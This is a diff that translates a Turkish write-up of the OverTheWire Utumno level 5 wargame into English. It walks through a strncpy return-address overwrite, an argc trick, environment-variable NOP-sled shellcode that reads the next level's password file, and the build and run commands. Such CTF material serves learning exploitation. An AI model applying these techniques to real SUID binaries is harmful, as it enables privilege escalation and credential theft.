@@ -1,43 +1,43 @@
-# OverTheWire — Utumno Level 5 Çözümü (utumno5 → utumno6)
+# OverTheWire — Utumno Level 5 Solution (utumno5 → utumno6)
 
-> Hedef: `utumno5` kullanıcısından `utumno6` kullanıcısının şifresini elde etmek.
-> Teknik: `hihi()` içinde **`strncpy` ile null-eklemeyen** stack overflow → tam 4-byte ret ezme;
-> argc-hilesi (utumno2) + executable stack'te env-var shellcode + gömülü `cat` komutu.
+> Goal: Get utumno6 user's password from `utumno5`.
+> Technique: **`strncpy` without null-termination** in `hihi()` → full 4-byte ret overwrite;
+> argc trick (utumno2) + env-var shellcode on executable stack + embedded `cat` command.
 
 ---
 
-## 1. Bağlantı
+## 1. Connection
 
 ```bash
 ssh utumno5@utumno.labs.overthewire.org -p 2227
-# şifre: **********   (bir önceki seviyeden)
+# password: **********   (from the previous level)
 ```
 
 ---
 
-## 2. Keşif (Recon)
+## 2. Recon
 
 ```bash
 ls -la /utumno/utumno5
-# -r-sr-x--- 1 utumno6 utumno5 13096 utumno5   <-- SUID utumno6, grup utumno5 = OKUNABİLİR
+# -r-sr-x--- 1 utumno6 utumno5 13096 utumno5   <-- SUID utumno6, group utumno5 = READABLE
 strings /utumno/utumno5
 #   strcpy, strncpy, strlen, printf, "Aw..", "Here we go - %s", "hihi"
-#   ... -fno-stack-protector ...                <-- canary YOK
+#   ... -fno-stack-protector ...                <-- NO canary
 readelf -l /utumno/utumno5 | grep GNU_STACK
 #   GNU_STACK ... RWE                            <-- stack EXECUTABLE
-/utumno/utumno5 < /dev/null   # "Aw.."  (argc kontrolü)
+/utumno/utumno5 < /dev/null   # "Aw.."  (argc check)
 ```
 
 ---
 
-## 3. Statik Analiz
+## 3. Static Analysis
 
 ### `main`
 ```c
 int main(int argc, char **argv) {
     if (argc == 0) goto proceed;
     if (argc != 1) { puts("Aw.."); exit(1); }
-    if (argv[0][0] == '\0') goto proceed;     // argc==1 && boş argv[0]
+    if (argv[0][0] == '\0') goto proceed;     // argc==1 && empty argv[0]
     puts("Aw.."); exit(1);
 proceed:
     printf("Here we go - %s\n", argv[10]);    // argv[10] = *(argv+0x28)
@@ -45,9 +45,9 @@ proceed:
     return 0;
 }
 ```
-utumno2 ile **aynı argc kısıtı** (`argc==0` veya `argc==1`+boş argv[0]) ve **aynı `argv[10]`** kaynağı.
+**Same argc constraint** as utumno2 (`argc==0` or `argc==1`+empty argv[0]) and **same `argv[10]`** source.
 
-### `hihi` (asıl zafiyet)
+### `hihi` (actual vulnerability)
 ```bash
 objdump -d -M intel /utumno/utumno5 | sed -n '/<hihi>:/,/^$/p'
 ```
@@ -55,30 +55,30 @@ objdump -d -M intel /utumno/utumno5 | sed -n '/<hihi>:/,/^$/p'
 void hihi(char *s) {
     char buf[12];                 // ebp-0xc
     if (strlen(s) <= 19)
-        strcpy(buf, s);           // <=19: kopyalar + NULL ekler (ret'in son byte'ı 0 olur)
+        strcpy(buf, s);           // <=19: copies + adds NULL (last byte of ret becomes 0)
     else
-        strncpy(buf, s, 20);      // >19: TAM 20 byte, NULL EKLEMEZ  <<< buradan
+        strncpy(buf, s, 20);      // >19: exactly 20 bytes, NO NULL ADDED  <<< use this
 }
 ```
 
-- `buf = ebp-0xc` (12 byte), return adresi `ebp+4` → mesafe `0xc + 4 = 16`.
-- **`strncpy` dalı (len > 19):** 20 byte kopyalanır, null eklenmez → `s[16..19]` = return adresinin
-  **4 baytı da tam** (null sorunu yok). 12 (buf) + 4 (saved ebp) + 4 (ret) = 20.
-- **`strcpy` dalı (len ≤ 19):** kopya null ile biter → ret'in 4. baytı 0 olurdu (kullanışsız).
+- `buf = ebp-0xc` (12 bytes), return address at `ebp+4` → distance = `0xc + 4 = 16`.
+- **`strncpy` branch (len > 19):** 20 bytes copied, no null added → `s[16..19]` = all **4 bytes of
+  return address** (no null problem). 12 (buf) + 4 (saved ebp) + 4 (ret) = 20.
+- **`strcpy` branch (len ≤ 19):** copy ends with null → last byte of ret becomes 0 (unusable).
 
-⇒ `strlen(s) > 19` olacak şekilde **20 baytlık** payload ver: `16 dolgu + 4 ret`.
+⇒ Give a **20-byte** payload with `strlen(s) > 19`: `16 padding + 4 ret`.
 
 ---
 
-## 4. Strateji (utumno2 ile aynı iskelet)
+## 4. Strategy (same skeleton as utumno2)
 
-- `execve(argv={NULL})` → kernel `argc=1`, `argv[0]=""` → `proceed`. `argv[10] = envp[8]`
-  (kernel zorlaması). Sağlamlık için payload'ı hem `envp[8]` hem `envp[9]`'a koy.
-- Payload = `"BBBBBBBBBBBBBBBB"` (16) + `RET` (4) = 20 byte → `strlen=20>19` → strncpy dalı.
-- `RET` = `EGG` env değişkenindeki NOP sled'i gösterir (stack RWE, ASLR yok).
-- Shellcode self-contained: `/bin/sh -c "cat /etc/utumno_pass/utumno6"` (utumno4'ten tek fark
-  komut string'inde `utumno5`→`utumno6`, bayt `0x35`→`0x36`).
-- Adres yine printer ile bulunur (`environ[0] + 4 + 30000`, sled ortası).
+- `execve(argv={NULL})` → kernel forces `argc=1`, `argv[0]=""` → `proceed`. `argv[10] = envp[8]`
+  (kernel forces this). For robustness, put payload in both `envp[8]` and `envp[9]`.
+- Payload = `"BBBBBBBBBBBBBBBB"` (16) + `RET` (4) = 20 bytes → `strlen=20>19` → strncpy branch.
+- `RET` points to NOP sled in `EGG` env variable (stack RWE, ASLR off).
+- Shellcode is self-contained: `/bin/sh -c "cat /etc/utumno_pass/utumno6"` (only difference
+  from utumno4: command string changes `utumno5`→`utumno6`, byte `0x35`→`0x36`).
+- Address found via printer (`environ[0] + 4 + 30000`, sled midpoint).
 
 ---
 
@@ -126,17 +126,17 @@ extern char **environ;
 int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
 ```
 
-### Çalıştırma
+### Execution
 ```bash
 gcc -m32 -o ex5 ex5.c
-gcc -m32 -o /tmp/p2A7xK9mLq pr.c        # 15-char path (kendi kullanıcına ait taze bir path kullan)
+gcc -m32 -o /tmp/p2A7xK9mLq pr.c        # 15-char path (use a fresh path for this user)
 
 ENV0=$(./ex5 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
 RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")
-./ex5 run "$RET"          # strncpy ret ezme -> sled -> shellcode -> cat
+./ex5 run "$RET"          # strncpy ret overwrite -> sled -> shellcode -> cat
 ```
 
-Çıktı:
+Output:
 ```
 ENV0=fffef4cb RET=ffff69ff
 **********
@@ -145,14 +145,13 @@ ENV0=fffef4cb RET=ffff69ff
 ---
 
 
-## Özet / Alınan Dersler
+## Summary / Lessons Learned
 
-| Konu | Not |
-|------|-----|
-| **`strcpy` vs `strncpy`** | `strcpy` null ekler (ret son byte = 0); `strncpy(.,.,20)` null EKLEMEZ → tam ret |
-| **Uzunluk dalını seç** | `strlen(s) > 19` ile bilerek `strncpy` dalına gir → 4-byte ret ezilir |
+| Topic | Note |
+|-------|------|
+| **`strcpy` vs `strncpy`** | `strcpy` adds null (last byte of ret = 0); `strncpy(.,.,20)` does NOT add null → full ret overwrite |
+| **Choose the length branch** | `strlen(s) > 19` deliberately enters the `strncpy` branch → 4-byte ret overwritten |
 | **Offset 16** | `buf=ebp-0xc` → 12 + 4 (saved ebp) = 16 |
-| **argc-hilesi tekrar** | utumno2 ile aynı: `argv[10]=envp[8/9]`, `execve argv={NULL}` |
-| **Tekrar kullanılan iskelet** | Aynı launcher + self-contained shellcode (komutta seviye no değişir) |
-| **/tmp çakışması** | Önceki seviyenin sahibi olduğu `/tmp` printer'ı üzerine yazılamaz → taze path kullan |
-
+| **argc trick again** | Same as utumno2: `argv[10]=envp[8/9]`, `execve argv={NULL}` |
+| **Reused skeleton** | Same launcher + self-contained shellcode (only level number changes in command) |
+| **/tmp conflict** | Previous level's owner's `/tmp` printer can't be overwritten → use a fresh path |
